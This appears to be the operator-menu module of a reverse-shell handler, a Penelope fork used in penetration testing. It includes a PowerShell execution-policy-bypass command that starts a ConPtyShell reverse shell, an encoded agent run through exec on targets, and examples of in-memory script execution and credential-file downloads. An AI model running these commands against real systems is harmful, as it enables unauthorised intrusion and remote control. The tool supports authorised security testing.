#!/usr/bin/env python3

# Part of Ariadne Shell Handler (a fork of Penelope, GPL-3.0-or-later). See LICENSE.

from .compat import *
from .messenger import Messenger
from .options import options
from .log import logger, cmdlogger
from .display import paint, Open, Table, Size, PBar, signal_bars, TAGS, HelpFormatter, LineBuffer, Interfaces
from .cli_input import stdout, ask, ask_listener, ask_target_os, my_input, BetterCMD, readline
from .network import ControlQueue, handle_bind_errors, Connect, Forwarding, TCPListener, Channel
from .modules import modules, Module, upload_extracted_archive, upload_single_from_archive
from .payload_data import URLS, PYTHON_STANDALONE_BINARIES
from .fileserver import FileServer
from .utils import (
	get_glob_size, shell_expand_remote_path, parse_transfer_output, completing_transfer_output,
	safe_tar_extractall, windows_zip_script, url_to_bytes,
)

# core, menu: injected by ariadne/__init__.py after the singletons exist.

class MainMenu(BetterCMD):

	help_prompt = re.compile(r"Run 'help [^\']*' for more information")

	def __init__(self, *args, **kwargs):
		super().__init__(*args, **kwargs)
		self.set_id(None)
		self.commands = {
			"Session Operations":['run', 'upload', 'download', 'open', 'maintain', 'spawn', 'upgrade', 'exec', 'script', 'portfwd'],
			"Session Management":['sessions', 'use', 'interact', 'kill', 'dir|.'],
			"Shell Management"  :['listeners', 'payloads', 'connect', 'Interfaces'],
			"Miscellaneous"     :['help', 'modules', 'history', 'cd', 'lcd', 'reset', 'reload', 'SET', 'DEBUG', 'exit|quit|q|Ctrl+D']
		}

	@property
	def raw_commands(self):
		return [command.split('|')[0] for command in sum(self.commands.values(), [])]

	def resolve_command(self, command):
		if command in self.raw_commands:
			return command
		matches = [candidate for candidate in self.raw_commands if candidate.startswith(command)]
		return matches[0] if len(matches) == 1 else command

	@property
	def active_sessions(self):
		active_sessions = len(core.sessions)
		if active_sessions:
			s = "s" if active_sessions > 1 else ""
			return paint(f" ({active_sessions} active session{s})").red + paint().yellow
		return ""

	@staticmethod
	def get_core_id_completion(text, *extra, attr='sessions'):
		choices = list(map(str, getattr(core, attr)))
		choices.extend(extra)
		return [choices for choices in choices if choices.startswith(text)]

	def set_id(self, ID):
		self.sid = ID
		session_part = (
				f"{paint('─(').cyan_DIM}{paint('Session').green} "
				f"{paint('[' + str(self.sid) + ']').red}{paint(')').cyan_DIM}"
		) if self.sid else ''
		self.prompt = (
				f"{paint(f'(').cyan_DIM}{paint('Ariadne').magenta}{paint(f')').cyan_DIM}"
				f"{session_part}{paint('>').cyan_DIM} "
		)

	def session_operation(current=False, extra=()):
		def inner(func):
			@wraps(func)
			def newfunc(self, ID):
				if current:
					if not self.sid:
						if core.sessions:
							cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")
						else:
							cmdlogger.warning("No available sessions to perform this action")
						return False
					if self.sid not in core.sessions:
						cmdlogger.warning(f"Session {self.sid} is no longer active")
						self.set_id(None)
						return False
				else:
					if ID:
						if ID not in core.sessions and ID not in extra:
							cmdlogger.warning("Invalid session ID")
							return False
					else:
						if self.sid:
							ID = self.sid
						else:
							cmdlogger.warning("No session selected")
							return None
				return func(self, ID)
			return newfunc
		return inner

	def interrupt(self):
		if core.attached_session and not core.attached_session.type == 'Readline':
			core.attached_session.detach()
		else: # TODO
			if menu.sid and not core.sessions[menu.sid].agent: # TEMP
				core.sessions[menu.sid].subchannel.control << 'stop'

	def show_help(self, command):
		parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")
		print("\n", paint(command).green, paint(parts[1]).blue, "\n")
		modified_parts = []
		for part in parts[2:]:
			part = self.help_prompt.sub('', part)
			modified_parts.append(part)
		print(indent("\n".join(modified_parts), '    '))

		if command == 'run':
			self.show_modules()

	def do_help(self, command):
		"""
		[command | -a]
		Show Main Menu help or help about a specific command

		Examples:

			help		Show all commands at a glance
			help interact	Show extensive information about a command
			help -a		Show extensive information for all commands
		"""
		if command:
			if command == "-a":
				for section in self.commands:
					print(f'\n{paint(section).yellow}\n{paint("=" * len(section)).cyan}')
					for command in self.commands[section]:
						self.show_help(command)
			else:
				if command in self.raw_commands:
					self.show_help(command)
				else:
					cmdlogger.warning(
						f"No such command: '{command}'. "
						"Issue 'help' for all available commands"
					)
		else:
			for section in self.commands:
				print(f'\n{paint(section).yellow}\n{paint("─" * len(section)).cyan}')
				table = Table(joinchar=' · ')
				for command in self.commands[section]:
					parts = dedent(getattr(self, f"do_{command.split('|')[0]}").__doc__).split("\n")[1:3]
					table += [paint(command).green, paint(parts[0]).blue, parts[1]]
				print(table)
			print()

	@session_operation(current=True)
	def do_cd(self, path):
		"""
		[remote path]
		Show/change the session's REMOTE working directory (used for transfers)

		Examples:

			cd		Show remote directory
			cd /tmp		Change remote directory to /tmp
		"""
		session = core.sessions[self.sid]
		if not path:
			print(paint(session.cwd).yellow)
			return
		if session.OS == 'Windows':
			try:
				path_parts = shlex.split(path, posix=False)
			except ValueError:
				path_parts = []
			if len(path_parts) != 1:
				logger.error(f"Cannot change remote directory to: {paint(path).red}")
				return
			path = path_parts[0].strip('"')
			path_b64 = base64.b64encode(path.encode()).decode()
			script = (
				f"$p=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{path_b64}'));"
				"if(Test-Path -LiteralPath $p -PathType Container){"
				"(Resolve-Path -LiteralPath $p).Path}"
			)
			encoded = base64.b64encode(script.encode('utf-16le')).decode()
			target = session.exec(
				f"powershell -NoProfile -EncodedCommand {encoded}",
				force_cmd=True, value=True
			)
			valid_target = isinstance(target, str) and PureWindowsPath(target).is_absolute()
		else:
			path = shell_unescape(path)
			target = session.exec(f"cd {shlex.quote(path)} 2>/dev/null && pwd", value=True)
			valid_target = isinstance(target, str) and target.startswith('/')
		if valid_target:
			session._cwd = target
			if session.agent:
				session.exec(f"os.chdir({target!r})", python=True, value=True)
			logger.info(f"Remote directory changed to: {paint(target).yellow}")
		else:
			logger.error(f"Cannot change remote directory to: {paint(path).red}")

	def do_lcd(self, path):
		"""
		[local path]
		Show/change Ariadne's LOCAL working directory

		Examples:

			lcd		Show local directory
			lcd /path	Change local directory to /path
		"""
		if not path:
			print(paint(os.getcwd()).yellow)
		else:
			path = Path(normalize_path(shell_unescape(path))).resolve()
			try:
				os.chdir(path)
				logger.info(f"Ariadne's local directory changed to: {paint(path).yellow}")
			except Exception as e:
				logger.error(e)

	@session_operation(extra=('none',))
	def do_use(self, ID):
		"""
		[SessionID|none]
		Select a session

		Examples:

			use swift-falcon	Select the session named swift-falcon
			use none	Unselect any selected session
		"""
		if ID == 'none':
			self.set_id(None)
		else:
			self.set_id(ID)

	def do_sessions(self, line):
		"""
		[SessionID]
		List active sessions or interact with a session

		Examples:

			sessions		Show active sessions
			sessions swift-falcon	Interact with the session named swift-falcon
		"""
		if line:
			if self.do_interact(line):
				return True
		else:
			if core.sessions:
				for host, sessions in core.hosts.items():
					if not sessions:
						continue
					print('\n' + sessions[0].name_colored)
					table = Table(joinchar=' | ')
					table.header = [paint(header).cyan for header in ('ID', 'Shell', 'User', 'Source', 'Recv', 'Sent', 'Signal')]
					for session in sessions:
						if self.sid == session.id:
							ID = paint('[' + str(session.id) + ']').red
						elif session.new:
							ID = paint('<' + str(session.id) + '>').yellow_BLINK
						else:
							ID = paint(' ' + str(session.id)).yellow
						source = session.listener or f'Connect({session._host}:{session.port})'
						sig = signal_bars(session.signal)
						if session.rtt_ms is not None:
							jit = f"±{session.jitter_ms:.0f}" if session.jitter_ms else ""
							sig += " " + str(paint(f"{session.rtt_ms:.0f}{jit}ms").darkgrey)
						sig = paint(sig)
						table += [
							ID,
							paint(session.type).CYAN if session.type == 'PTY' else session.type,
							session.user or 'N/A',
							source,
							Size(session.bytes_received),
							Size(session.bytes_sent),
							sig
						]
					print("\n", indent(str(table), "    "), "\n", sep="")
			else:
				print()
				cmdlogger.warning("No sessions yet")
				print()

	@session_operation()
	def do_interact(self, ID):
		"""
		[SessionID]
		Interact with a session

		Examples:

			interact	Interact with current session
			interact swift-falcon	Interact with the session named swift-falcon
		"""
		return core.sessions[ID].attach()

	@session_operation(extra=('*',))
	def do_kill(self, ID):
		"""
		[SessionID|*]
		Kill a session

		Examples:

			kill		Kill the current session
			kill swift-falcon	Kill the session named swift-falcon
			kill *		Kill all sessions
		"""

		if ID == '*':
			if not core.sessions:
				cmdlogger.warning("No sessions to kill")
				return False
			else:
				if ask(f"Kill all sessions{self.active_sessions} (y/N): ").lower() == 'y':
					if options.maintain > 1:
						options.maintain = 1
						self.onecmd("maintain")
					for session in reversed(list(core.sessions.values())):
						session.kill()
				else:
					return False
		else:
			core.sessions[ID].kill()

		if options.single_session and len(core.sessions) == 1:
			core.stop()
			logger.info("Ariadne exited due to Single Session mode")
			return True

	def do_portfwd(self, line):
		"""
		[<local host:port> -> <remote host:port> | stop <id|*>]
		Forward a local port through the session to a host the target can reach
		The left side is on your machine and the right side is resolved by the target: Ariadne
		listens on the left, and each connection is tunneled through the session so that the
		target is the one connecting to the right. Select a session first with "use <ID>".

		Examples:

			portfwd -> 127.0.0.1:3306		Reach the target's own MySQL on your 127.0.0.1:3306
			portfwd 3307 -> 127.0.0.1:3306		Same, but listen on your 127.0.0.1:3307
			portfwd -> 192.168.0.1:80		Reach 192.168.0.1:80 from the target's network, on your 127.0.0.1:80
			portfwd 0.0.0.0:8080 -> 192.168.0.1:80	Same, but listen on 0.0.0.0:8080 so others can use it too
			portfwd					List the active Port Forwards and their IDs
			portfwd stop 1				Stop the Port Forward with ID 1
			portfwd stop *				Stop all Port Forwards
		"""
		if not line:
			if core.forwardings:
				table = Table(joinchar=' | ')
				table.header = [paint(header).orange for header in ('ID', 'Session', 'Type', 'Local', 'Remote')]
				for fwd in list(core.forwardings.values()):
					_type, lhost, lport, rhost, rport = fwd.info
					table += [fwd.id, fwd.session.id, 'Local' if _type == 'L' else 'Remote',
						f"{lhost}:{lport}", f"{rhost}:{rport}"]
				print('\n', indent(str(table), '  '), '\n', sep='')
			else:
				cmdlogger.warning("No active Port Forwards...")
			return

		args = line.split()

		if args[0] == 'stop':
			if len(args) < 2:
				cmdlogger.warning("Specify a Port Forward ID (or *) to stop")
				return False
			if args[1] == '*':
				forwardings = list(core.forwardings.values())
				if not forwardings:
					cmdlogger.warning("No Port Forwards to stop...")
					return False
				for fwd in forwardings:
					fwd.stop()
			else:
				try:
					core.forwardings[int(args[1])].stop()
				except (KeyError, ValueError):
					cmdlogger.warning("Invalid Port Forward ID")
			return

		if not self.sid:
			if core.sessions:
				cmdlogger.warning("No session ID selected. Select one with \"use [ID]\"")
			else:
				cmdlogger.warning("No available sessions to perform this action")
			return False

		match = re.search(r"((?:.*)?)(<-|->)((?:.*)?)", line)
		if match:
			group1 = match.group(1)
			arrow = match.group(2)
			group2 = match.group(3)
		else:
			cmdlogger.warning("Invalid syntax")
			return False

		group1, group2 = group1.strip(), group2.strip()
		rhost = rport = lhost = lport = None

		if arrow == '->':
			_type = 'L'
			lhost = "127.0.0.1"

			if group2 and ':' in group2:
				rhost, rport = group2.rsplit(':', 1)
				lport = rport
			if not rport:
				cmdlogger.warning("At least remote port is required")
				return False

			if group1:
				if ':' in group1:
					lhost, lport = group1.rsplit(':', 1)
					if not lhost:
						lhost = "127.0.0.1"
				else:
					lport = group1
		elif arrow == '<-':
			_type = 'R'

			if group2 and ':' in group2:
				rhost, rport = group2.rsplit(':', 1)

			if group1 and ':' in group1:
				lhost, lport = group1.rsplit(':', 1)
			else:
				cmdlogger.warning("At least local port is required")
				return False

			if not (rhost and rport):
				cmdlogger.warning("Remote endpoint (host:port) is required for reverse forwarding")
				return False

		for label, port in (("remote", rport), ("local", lport)):
			if not (port and port.isdigit() and 0 < int(port) <= 65535):
				cmdlogger.warning(f"Invalid {label} port: '{port}'. Valid numbers: 1-65535")
				return False

		if _type == 'R':
			cmdlogger.warning("Reverse (<-) port forwarding is not implemented yet")
			return False

		core.sessions[self.sid].portfwd(_type=_type, lhost=lhost, lport=lport, rhost=rhost, rport=int(rport))

	@session_operation(current=True)
	def do_download(self, remote_items):
		"""
		<remote path|glob>... [-o|--output <local folder>]
		Download files / folders from the target

		-o <folder>   Save into <folder>

		Examples:

			download /etc			Download a remote directory
			download /etc/passwd		Download a remote file
			download /etc/cron*		Download multiple remote files and directories using glob
			download /etc/issue /var/spool	Download multiple remote files and directories at once
		"""
		windows_paths = getattr(core.sessions[self.sid], 'OS', None) == 'Windows'
		remote_items, download_folder = parse_transfer_output(
			remote_items, source_windows=windows_paths)

		if download_folder is None and options.download_folder:
			download_folder = options.download_folder
		reroot = download_folder is not None
		if remote_items:
			core.sessions[self.sid].download(remote_items, download_folder=download_folder, reroot=reroot)
		else:
			cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_open(self, remote_items):
		"""
		<remote path|glob>...
		Download remote files or directories and open them with the local default application

		Examples:

			open /etc			Open locally a remote directory
			open /root/secrets.ods		Open locally a remote file
			open /etc/cron*			Open locally multiple remote files and directories using glob
			open /etc/issue /var/spool	Open locally multiple remote files and directories at once
		"""
		if remote_items:
			items = core.sessions[self.sid].download(remote_items)

			if len(items) > options.max_open_files:
				cmdlogger.warning(
					f"More than {options.max_open_files} items selected"
					" for opening. The open list is truncated to "
					f"{options.max_open_files}."
				)
				items = items[:options.max_open_files]

			for item in items:
				Open(item)
		else:
			cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_upload(self, local_items):
		"""
		<path|glob|URL>... [-o|--output <remote folder>]
		Upload local files, directories, or HTTP(S)/FTP URLs to the target
		URLs are downloaded by Ariadne and then uploaded to the target, allowing transfers when
		the target has no direct Internet access.

		-o <folder>   Upload into the remote <folder>

		Examples:

			upload /tools					  Upload a directory
			upload /tools/mysuperdupertool.sh		  Upload a file
			upload /tools/privesc* /tools2/*.sh		  Upload multiple files and directories using glob
			upload https://github.com/x/y/z.sh		  Download the file locally and then push it to the target
			upload https://www.exploit-db.com/exploits/40611  Download the underlying exploit code locally and upload it to the target
		"""
		remote_folder = None
		windows_destination = getattr(core.sessions[self.sid], 'OS', None) == 'Windows'
		local_items, remote_folder = parse_transfer_output(
			local_items, destination_windows=windows_destination)
		if local_items:
			core.sessions[self.sid].upload(local_items, remote_path=remote_folder,
				randomize_fname=options.upload_random_suffix)
		else:
			cmdlogger.warning("No files or directories specified")

	@session_operation(current=True)
	def do_script(self, local_item):
		"""
		<local_script|URL>
		In-memory local or URL script execution & real time downloaded output

		Examples:
			script https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
		"""
		if local_item:
			core.sessions[self.sid].script(local_item)
		else:
			cmdlogger.warning("No script to execute")

	@staticmethod
	def show_modules():
		categories = defaultdict(list)
		for module in modules().values():
			categories[module.category].append(module)

		print()
		for category in categories:
			print("  " + str(paint(category).BLUE))
			table = Table(joinchar=' │ ')
			for module in categories[category]:
				description = module.run.__doc__ or ""
				if description:
					description = module.run.__doc__.strip().splitlines()[0]
				table += [paint(module.__name__).red, description]
			print(indent(str(table), '  '), "\n", sep="")

	@session_operation(current=True)
	def do_run(self, line):
		"""
		[module name]
		Run a module. Run 'help run' to view the available modules
		"""
		try:
			parts = line.split(" ", 1)
			module_name = parts[0]
		except AttributeError:
			module_name = None
			print()
			cmdlogger.warning(paint("Select a module").YELLOW_white)

		if module_name:
			module = modules().get(module_name)
			if module:
				args = parts[1] if len(parts) == 2 else ''
				if module.enabled:
					module.run(core.sessions[self.sid], args)
				else:
					cmdlogger.warning(f"Module '{module_name}' is disabled")
			else:
				cmdlogger.warning(f"Module '{module_name}' does not exist")
		else:
			self.show_modules()

	@session_operation(current=True)
	def do_spawn(self, line):
		"""
		[Port] [Host]
		Spawn another shell from the selected target

		Examples:

			spawn			Spawn a new session. If the current is bind then in will create a
						bind shell. If the current is reverse, it will spawn a reverse one

			spawn 5555		Spawn a reverse shell on 5555 port. This can be used to get shell
						on another tab. In another tab run: ariadne -p 5555

			spawn 3333 10.10.10.10	Connect a new reverse shell to 10.10.10.10:3333
		"""
		host, port = None, None

		if line:
			args = line.split(" ")
			try:
				port = int(args[0])
			except ValueError:
				cmdlogger.error("Port number should be numeric")
				return False
			arg_num = len(args)
			if arg_num == 2:
				host = args[1]
			elif arg_num > 2:
				print()
				cmdlogger.error("Invalid PORT - HOST combination")
				self.onecmd("help spawn")
				return False

		core.sessions[self.sid].spawn(port, host)

	def do_maintain(self, line):
		"""
		[NUM]
		Maintain NUM active shells for each target

		Examples:

			maintain 5		Maintain 5 active shells
			maintain 1		Disable maintain functionality
		"""
		if line:
			if line.isnumeric():
				num = int(line)
				options.maintain = num
				targets = [h[0] for h in core.hosts.values() if h and len(h) < options.maintain]
				refreshed = bool(targets)
				for first in targets:
					first.maintain()
				if not refreshed:
					self.onecmd("maintain")
			else:
				cmdlogger.error("Invalid number")
		else:
			status = paint('Enabled').white_GREEN if options.maintain >= 2 else paint('Disabled').white_RED
			cmdlogger.info(f"Maintain value set to {paint(options.maintain).yellow} {status}")

	@session_operation(current=True)
	def do_upgrade(self, ID):
		"""

		Upgrade the current session's shell to PTY
		Note: By default this is automatically run on the new sessions. Disable it with -U
		"""
		session = core.sessions[self.sid]
		if session.OS == 'Unix':
			session.upgrade()
		else:
			uploaded = session.upload(URLS['conptyshell'], remote_path=session.tmp)
			if not uploaded:
				cmdlogger.error("Failed to upload ConPtyShell")
				return
			conptyshell_path = uploaded[0]
			shell_type = 'cmd' if session.subtype == 'cmd' else 'powershell'
			session.exec(
				f"powershell -nop -ep bypass -c \"iex(get-content {conptyshell_path} -raw); "
				f"Invoke-ConPtyShell -RemoteIp {session._host} "
				f"-RemotePort {session._port} -Rows 24 -Cols 80 -CommandLine {shell_type}\"",
				force_cmd=True, raw=True
			)

	def do_dir(self, ID):
		"""
		[SessionID]
		Open the selected session's local folder, or Ariadne's base folder if no session is selected
		"""
		session = core.sessions.get(self.sid)
		folder = session.directory if session else options.basedir
		print(folder)
		Open(folder)

	@session_operation(current=True)
	def do_exec(self, cmdline):
		"""
		<remote command>
		Execute a command on the target and print its output

		Examples:
			exec cat /etc/passwd
		"""
		if cmdline:
			if core.sessions[self.sid].agent:
				core.sessions[self.sid].exec(
					cmdline,
					timeout=None,
					stdout_dst=sys.stdout.buffer,
					stderr_dst=sys.stderr.buffer
				)
			else:
				output = core.sessions[self.sid].exec(
					cmdline,
					timeout=None,
					value=True
				)
				print(output)
		else:
			cmdlogger.warning("No command to execute")

	def do_listeners(self, line):
		"""
		[add [-i <interface>] [-p <ports>] [-j <host:port>] | stop <id|*>]
		Add / stop / view Listeners

		Examples:

			listeners			Show active Listeners
			listeners add -i any -p 4444	Create a Listener on 0.0.0.0:4444
			listeners stop 1		Stop the Listener with ID 1
		"""
		if line:
			parser = ArgumentParser(prog="listeners")
			subparsers = parser.add_subparsers(dest="command", required=True)

			parser_add = subparsers.add_parser("add", help="Add a new listener")
			parser_add.add_argument("-i", "--interface", help="Interface to bind", default="any")
			parser_add.add_argument("-p", "--ports", help="Ports to listen on (comma separated)", default=[options.default_listener_port])
			parser_add.add_argument("-t", "--type", help="Listener type", default='tcp')
			parser_add.add_argument("-j", "--jump", action="append", help="Jump endpoint")

			parser_stop = subparsers.add_parser("stop", help="Stop a listener")
			parser_stop.add_argument("id", help="Listener ID to stop")

			try:
				args = parser.parse_args(line.split())
			except SystemExit:
				return False

			if args.command == "add":
				options.ports = args.ports
				if args.type == 'tcp':
					for port in options.ports:
						TCPListener(args.interface, port, args.jump)

			elif args.command == "stop":
				if args.id == '*':
					listeners = list(core.listeners.values())
					if listeners:
						for listener in listeners:
							listener.stop()
					else:
						cmdlogger.warning("No listeners to stop...")
						return False
				else:
					try:
						core.listeners[int(args.id)].stop()
					except (KeyError, ValueError):
						logger.error("Invalid Listener ID")

		else:
			if core.listeners:
				table = Table(joinchar=' | ')
				table.header = [paint(header).orange for header in ('ID', 'Type', 'Host', 'Port')]
				for listener in list(core.listeners.values()):
					table += [listener.id, listener.__class__.__name__, listener.host, listener.port]
				print('\n', indent(str(table), '  '), '\n', sep='')
			else:
				cmdlogger.warning("No active Listeners...")

	def do_connect(self, line):
		"""
		<Host> <Port>
		Connect to a bind shell

		Examples:

			connect 192.168.0.101 5555
		"""
		if not line:
			cmdlogger.warning("No target specified")
			return False
		try:
			address, port = line.split(' ')

		except ValueError:
			cmdlogger.error("Invalid Host-Port combination")

		else:
			if Connect(address, port) and not options.no_attach:
				return True

	def do_payloads(self, line):
		"""
		[interface_name]
		Show example reverse-shell commands for the active listeners
		Asks which Listener to point at, and whether the target runs Linux or Windows, so you
		only get the payloads that can actually run there. Answer "*" for every Listener and
		"both" for every payload.
		"""
		if not core.listeners:
			cmdlogger.warning("No Listeners to show payloads")
			return

		listeners = ask_listener()
		if not listeners:
			return

		target_os = ask_target_os()
		if not target_os:
			return

		print()
		for listener in listeners:
			print(listener.payloads(line, target_os))

	def do_Interfaces(self, line):
		"""

		Show the local network interfaces
		"""
		print(Interfaces())

	def do_exit(self, line):
		"""

		Exit Ariadne
		"""
		if ask(f"Exit Ariadne?{self.active_sessions} (y/N): ").lower() == 'y':
			super().do_exit(line)
			core.stop()
			for thread in threading.enumerate():
				if thread.name == 'Core':
					thread.join()
			# Give the remaining workers a bounded chance to exit on their own
			# (exec/stream threads unwind once kill() closes their fds), so the
			# interpreter's _thread._shutdown() join never has to wait on them.
			deadline = time.time() + 3
			for thread in threading.enumerate():
				if thread is not threading.main_thread() and not thread.daemon and thread.is_alive():
					thread.join(timeout=max(0.05, deadline - time.time()))
			cmdlogger.info("Exited!")
			leftover = [thread for thread in threading.enumerate()
				if thread is not threading.main_thread() and not thread.daemon and thread.is_alive()]
			if leftover:
				cmdlogger.error(f"REMAINING THREADS: {leftover}")
			elif options.dev_mode:
				cmdlogger.info("All worker threads exited cleanly")
			return True
		return False

	def do_EOF(self, line):
		if self.sid:
			self.set_id(None)
			print()
		else:
			print("exit")
			return self.do_exit(line)

	def do_modules(self, line):
		"""

		Show available modules
		"""
		self.show_modules()

	def do_reload(self, line):
		"""

		Reload the rc file
		"""
		load_rc()

	def do_SET(self, line):
		"""
		[option, [value]]
		Show / set option values

		Examples:

			SET			Show all options and their current values
			SET no_upgrade		Show the current value of no_upgrade option
			SET no_upgrade True	Set the no_upgrade option to True
		"""
		if not line:
			rows = [ [paint(param).cyan, paint(repr(getattr(options, param))).yellow]
					for param in options.__dict__]
			table = Table(rows, fillchar=[paint('.').green, 0], joinchar=' => ')
			print(table)
		else:
			try:
				args = line.split(" ", 1)
				param = args[0]
				if len(args) == 1:
					value = getattr(options, param)
					if isinstance(value, (list, dict)):
						value = dumps(value, indent=4)
					print(f"{paint(value).yellow}")
				else:
					from ast import literal_eval
					new_value = literal_eval(args[1])
					old_value = getattr(options, param)
					setattr(options, param, new_value)
					if getattr(options, param) != old_value:
						cmdlogger.info(f"'{param}' option set to: {paint(getattr(options, param)).yellow}")

			except AttributeError:
				cmdlogger.error("No such option")

			except Exception as e:
				cmdlogger.error(f"{type(e).__name__}: {e}")

	def default(self, line):
		if line in ['q', 'quit']:
			return self.onecmd('exit')
		elif line == '.':
			return self.onecmd('dir')
		else:
			parts = line.split(" ", 1)
			candidates = [command for command in self.raw_commands if command.startswith(parts[0])]
			if not candidates:
				cmdlogger.warning(f"No such command: '{line}'. Issue 'help' for all available commands")
			elif len(candidates) == 1:
				cmd = candidates[0]
				if len(parts) == 2:
					cmd += " " + parts[1]
				stdout(f"\x1b[1A\x1b[2K{self.prompt}{cmd}\n".encode(), False)
				return self.onecmd(cmd)
			else:
				cmdlogger.warning(f"Ambiguous command. Can mean any of: {candidates}")

	def complete_SET(self, text, line, begidx, endidx):
		return [option for option in options.__dict__ if option.startswith(text)]

	def complete_listeners(self, text, line, begidx, endidx):
		last = -2 if text else -1
		arg = line.split()[last]

		if arg == 'listeners':
			return [command for command in ["add", "stop"] if command.startswith(text)]
		elif arg in ('-i', '--interface'):
			return [iface_ip for iface_ip in Interfaces().list_all + ['any', '0.0.0.0'] if iface_ip.startswith(text)]
		elif arg in ('-t', '--type'):
			return [_type for _type in ("tcp",) if _type.startswith(text)]
		elif arg == 'stop':
			return self.get_core_id_completion(text, "*", attr='listeners')

	def complete_portfwd(self, text, line, begidx, endidx):
		last = -2 if text else -1
		arg = line.split()[last]

		if arg == 'portfwd':
			return [command for command in ["stop"] if command.startswith(text)]
		elif arg == 'stop':
			return self.get_core_id_completion(text, "*", attr='forwardings')

	def complete_payloads(self, text, line, begidx, endidx):
		return [iface for iface in Interfaces().list if iface.startswith(text)]

	def _complete_local_path(self, line, begidx, endidx):
		return self.complete_path(line, begidx, endidx, self._local_lister,
			expand=lambda p: os.path.expandvars(os.path.expanduser(p)), windows=(myOS == 'Windows'))

	def _complete_remote_path(self, line, begidx, endidx, session):
		return self.complete_path(line, begidx, endidx, session.get_remote_completion,
			windows=(session.OS == 'Windows'))

	def _complete_transfer(self, line, begidx, endidx, upload):
		session = core.sessions.get(self.sid)
		if session is None:
			return []

		local_windows = myOS == 'Windows'
		remote_windows = session.OS == 'Windows'
		completing_output = completing_transfer_output(
			line, begidx,
			source_windows=local_windows if upload else remote_windows,
			destination_windows=remote_windows if upload else local_windows,
		)
		complete_remote = completing_output == upload
		if complete_remote:
			return self._complete_remote_path(line, begidx, endidx, session)
		return self._complete_local_path(line, begidx, endidx)

	def complete_upload(self, text, line, begidx, endidx):
		return self._complete_transfer(line, begidx, endidx, upload=True)

	def complete_script(self, text, line, begidx, endidx):
		return self._complete_local_path(line, begidx, endidx)

	complete_lcd = complete_script

	def complete_download(self, text, line, begidx, endidx):
		return self._complete_transfer(line, begidx, endidx, upload=False)

	def complete_open(self, text, line, begidx, endidx):
		session = core.sessions.get(self.sid)
		return self._complete_remote_path(line, begidx, endidx, session) if session else []

	complete_cd = complete_open

	def complete_use(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text, "none")

	def complete_sessions(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text)

	def complete_interact(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text)

	def complete_kill(self, text, line, begidx, endidx):
		return self.get_core_id_completion(text, "*")

	def complete_run(self, text, line, begidx, endidx):
		return [module.__name__ for module in modules().values() if module.__name__.startswith(text)]

	def complete_help(self, text, line, begidx, endidx):
		return [command for command in self.raw_commands if command.startswith(text)]




def _agent_deploy_command(_bin, agent_source, _decode, shell_repr, net_buf, messenger_src, stream_src, target_shell_repr, exec_src):
	"""Format the agent payload source, compress it and build the target-side
	deploy command. In dev mode the bootstrap is wrapped so an agent crash
	persists its traceback on the target (/tmp/agent_crash.txt) instead of
	dying with the PTY reader.

	Kept as a separate function so tests can verify the exact deploy pipeline
	(brace-escaping in the agent source, payload encoding, cmd construction)."""
	agent = dedent('\n'.join(agent_source.splitlines()[1:])).format(
		shell_repr,
		net_buf,
		messenger_src,
		stream_src,
		target_shell_repr,
		exec_src
	)
	payload = base64.b64encode(zlib.compress(agent.encode(), 9)).decode()
	# Traces are always-on while the agent-death issue is open: the agent's
	# stderr dies with the PTY reader, so crashes/exits are otherwise silent.
	inner = (
		"import base64,zlib,traceback,os,signal\n"
		"os.environ['ARIADNE_DEBUG'] = '1'\n"
		"open('/tmp/agent_pid.txt', 'w').write(str(os.getpid()))\n"
		"def _ariadne_sig(sig, frame):\n"
		"    open('/tmp/agent_sig.txt', 'a').write(signal.Signals(sig).name + '\\n')\n"
		"    signal.signal(sig, signal.SIG_DFL)\n"
		"    os.kill(os.getpid(), sig)\n"
		"for _s in (signal.SIGTERM, signal.SIGHUP, signal.SIGINT, signal.SIGQUIT):\n"
		"    try:\n"
		"        signal.signal(_s, _ariadne_sig)\n"
		"    except Exception:\n"
		"        pass\n"
		f"try:\n exec(zlib.decompress(base64.{_decode}({payload!r})))\n"
		"except BaseException:\n"
		" open('/tmp/agent_crash.txt','w').write(traceback.format_exc())\n"
		" raise\n"
		"finally:\n"
		" open('/tmp/agent_exit.txt','a').write('bootstrap returned\\n')\n"
	)
	cmd = f'{shlex.quote(_bin)} -Wignore -c {shlex.quote(inner)}'
	return agent, payload, cmd


class Session:

	def __init__(self, _socket, target, port, listener=None):
		with core.conn_semaphore:
			#print(core.threads)
			print("\a", flush=True, end='')

			self.socket = _socket
			self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			self.socket.setblocking(False)
			self.target, self.port = target, port
			try:
				self.ip = _socket.getpeername()[0]
			except OSError:
				logger.error(f"Invalid connection from {self.target}")
				self.socket.close()
				return
			self._host, self._port = self.socket.getsockname()
			self.listener = listener
			self.source = 'reverse' if listener else 'bind'

			self.id = None
			self.OS = None
			self.type = 'Raw'
			self.subtype = None
			self.interactive = None
			self.echoing = None
			self.pty_ready = None

			self.win_version = None

			self.prompt = None
			self.new = True

			self.timeout_short = options.timeout_short
			self.timeout_long = options.timeout_long
			self.compression_level = options.compression_level

			self.last_lines = LineBuffer(options.attach_lines)
			self.lock = threading.Lock()
			self.wlock = threading.Lock()
			self.data_route_lock = threading.Lock()
			self.log_lock = threading.Lock()
			self.logfile = io.BytesIO()

			self.outbuf = io.BytesIO()
			self.bytes_sent = 0
			self.bytes_received = 0
			self.rtt_ms = None
			self.jitter_ms = None
			self.signal = -1
			self.shell_response_buf = io.BytesIO()

			self.tasks = {"portfwd":[], "scripts":[]}
			self.subchannel = Channel()
			self.latency = None

			#self.alternate_buffer = False
			self.agent = False
			self.messenger = Messenger(io.BytesIO)

			self.streamID = 0
			self.streams = dict()
			self.stream_lock = threading.Lock()
			self._closing = False
			self.stream_code = Messenger.STREAM_CODE
			self.streams_max = 2 ** (8 * Messenger.STREAM_BYTES)

			self.shell_pid = None
			self.user = None
			self.tty = None

			self._bin = defaultdict(lambda: "")
			self._tmp = None
			self._exec_tmp = None
			self._cwd = None
			self._can_deploy_agent = None
			self._has_persistent_shell = None
			self._libc = None
